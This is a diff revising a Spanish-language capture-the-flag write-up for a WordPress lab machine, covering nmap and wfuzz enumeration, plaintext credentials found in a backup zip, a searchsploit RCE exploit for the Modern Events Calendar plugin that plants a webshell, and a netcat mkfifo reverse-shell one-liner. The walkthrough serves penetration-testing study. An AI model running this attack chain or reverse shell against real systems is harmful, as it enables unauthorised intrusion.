@@ -10,16 +10,16 @@ ___
 
 Usaremos `nmap -n -v --open -sV -sC -Pm -oN escaneo <IP>`.  
 
-Del mismo obtenemos:  
+Obtenemos:  
 * el puerto 80 está abierto
 * la versión es Apache 2.4.58
-* que el sistema objetivo es un Ubuntu
+* el sistema objetivo es un Ubuntu
 
-Ahora, procedemos con `whatweb <IP>` para más **Footprinting Web**. Vemos que también tiene *JQuery 3.7.1*. Podría sernos útil más adelante.  
+Ahora, procedemos con `whatweb <IP>` para más **Footprinting Web**. Vemos que se trata de un *WordPress 6.8.3* y que usa la librería *JQuery 3.7.1*. Podría ser de utilidad más adelante.  
 
 2. **Enumeración Web**:  
 
-2.1. Empezamos con los **Directorios**, usando, por ejemplo:  
+2.1. Empezamos con los **Directorios**. Por ejemplo:  
 
 `wfuzz -c --hc 404 -t 200 -z file,<diccionario> -R 3 -u "http://<IP>/FUZZ"`  
 
@@ -50,7 +50,7 @@ Encontramos:
 
 2.2 Ahora proseguimos con los **Recursos** (*PHP-HTML-TXT*):  
 
-`wfuzz -c --hc 404 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt -u "http://<IP>/FUZZ.FUZ2Z"`  
+`wfuzz -c --hc 404 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://<IP>/FUZZ.FUZ2Z"`  
 
 ```
 - /index.php       
@@ -64,25 +64,28 @@ Encontramos:
 ```
 
 3. Búsqueda de Vulnerabilidades:
-No parecen haber vulnerabilidades por el momento.
+No parecen haber, por el momento.
 
 ___
 
 #### FASE EXPLOTACIÓN:
-1. **Web**:  
-De dichas enumeraciónes, por el momento nos quedamos con `/backups`. Yendo a este endpoint vemos que podemos descargar un recurso: `databaseback2may.zip`. Lo hacemos.
-Primero revisamos localmente, sin extraer para estar seguros, con `unzip -l <zip>`. Vemos que contiene un único archivito llamado `29DBMay`.  
-Ahora procedemos a extraerlo con `unzip <zip>`. Le hacemos un `cat 29DBMay` y obtenemos las credenciales `developer:2wmy3KrGDRD%RsA7Ty5n71L^`.  
-Investigando un poco con `hashid 2wmy3KrGDRD%RsA7Ty5n71L^` y en la web, vemos que no se trata de una hash válido ni base64, entonces probablemente sea la password, en texto claro.  
+1. **Web**:
 
-Entonces, procedemos a probar nuestras nuevas credenciales en el endpoint `/wp-login.php` y logramos **Footholding Web**.  
+De dichas enumeraciónes, empezamos con `/backups`. Yendo a este endpoint vemos que podemos descargar un recurso: `databaseback2may.zip`. Lo hacemos.  
+
+Revisamos localmente, sin extraer hasta estar seguros. Usamos `unzip -l <zip>`. Vemos que contiene un único archivito llamado `29DBMay`. Procedemos a extraerlo con `unzip <zip>`. Hacemos un `cat 29DBMay` y obtenemos las credenciales `developer:2wmy3KrGDRD%RsA7Ty5n71L^`.  
+
+Probando con `hashid 2wmy3KrGDRD%RsA7Ty5n71L^` e investigando un poco en la web, vemos que no se trata de una *hash* válido, ni una *codificación* (como base64, etc.). Entonces, probablemente, sea la password en texto claro.  
+
+Por lo tanto, procedemos a probar nuestras nuevas credenciales en el endpoint `/wp-login.php`, y logramos **Footholding Web**.  
 
 2. **Sistema**:  
-Navegando por el dashboard encontramos otro endpoint interesante, por el cual podríamos pobrar subir una *WebShell* y así lograr **Acceso Inicial al Sistema**. Este recurso es `/wp-admin/media-new.php`. Al intentar subir algún archivo nos damos cuenta que no es posible, porque no tenemos los permisos como `developer`.  
 
-Entonces, probamos hacer más **Footprinting Web**. Encontramos que: 
+Navegando por el panel de WordPress, encontramos un endpoint interesante: `/wp-admin/media-new.php`. Podríamos intentar subir una *WebShell*, por ejemplo. Entonces, probamos subir cualquier archivo, nos damos cuenta que no es posible, que no tenemos permisos con `developer`.  
 
-* Se trata de un WordPress 6.8.3
+Entonces, hacemos más **Footprinting Web**, visualmente. Encontramos que:  
+
+* Es un WordPress 6.8.3 (como ya sabíamos)
 * Hay *Plugins* instalados como:
 	* Askimet 5.3.2
 	* Modern Events Calendar Lite 5.16.2
@@ -92,20 +95,22 @@ Entonces, probamos hacer más **Footprinting Web**. Encontramos que:
 	*  Twenty Twenty-Three 1.4
 	*  Twenty Twenty-Two 1.7
 			
-* Hay otro usuario *admin* llamado `eric`.  
+* Hay otro usuario administrador llamado `eric`.  
 
-Entonces, usamos la herramienta `searchsploit` para buscar **Exploits**. Después de algún tiempo, encontramos uno directo para RCE, para el **Plugin Modern Events Calendar Lite 5.16.2** de Wordpress. Lo descargamos con `searchsploit -m <exploit>`.  
+Entonces, usamos la herramienta `searchsploit` para buscar **Exploits**. Después de algún tiempo, encontramos uno específico de RCE, para el **Plugin Modern Events Calendar Lite 5.16.2** de Wordpress. Lo descargamos con `searchsploit -m <ruta_exploit>`.  
 
 Siguiendo las instrucciones del mismo, nos termina dando la URL de la webshell que acaba de subir:  
-`http://<IP_Whoiam>/wp-content/uploads/shell.php)`  
+`http://<IP_Whoiam>/wp-content/uploads/shell.php`  
 
-Nos dirigimos allí en el navegador y nos abre una [PownyWebShell](https://github.com/flozz/p0wny-shell). Esta se lanza en propio browser. Es bastante limitada, pero hacemos `whoami ==> www-data` y confirmamos **FootHolding en el Sistema**.  
+Nos dirigimos allí en el navegador y nos abre una [PownyWebShell](https://github.com/flozz/p0wny-shell) en el mismo. Es bastante limitada, pero ejecutamos `whoami` y nos devuelve `www-data`.  
+
+Confirmamos **FootHolding en el Sistema**.  
 
 2.1 **Mejorando el Entorno**  
 
-Dicho esto, ahora deberíamos lanzar una **Reverse Shell** para tener un mejor manejo localmente. Para ello, preparamos un **Listener**. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda a la escucha.  
+Ahora deberíamos lanzar una **Reverse Shell**, para tener un mejor manejo local. Para ello, preparamos un **Listener**. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda a la escucha.  
 
-Ahora, debemos ver las herramientas instaladas en el sistema para lanzar la *RevShell*. Hacemos `which python python2 python3 nc ...` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y encontramos que la manera de lanzarla según el sistema de la víctima, es con la versión portable (POSIX) de `nc`. Ejecutamos `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`.  
+Ahora, debemos ver las herramientas instaladas en el sistema para lanzar la **Conexión Reversa**. Hacemos `which python python2 python3 nc ...` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y encontramos que la manera de hacerlo, según el sistema de la víctima, es con la versión portable (POSIX) de `nc`. Ejecutamos, entonces, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`.  
 
 Una vez lograda la conexión, tenemos mucha más funcionalidad y mejor entorno.  
 
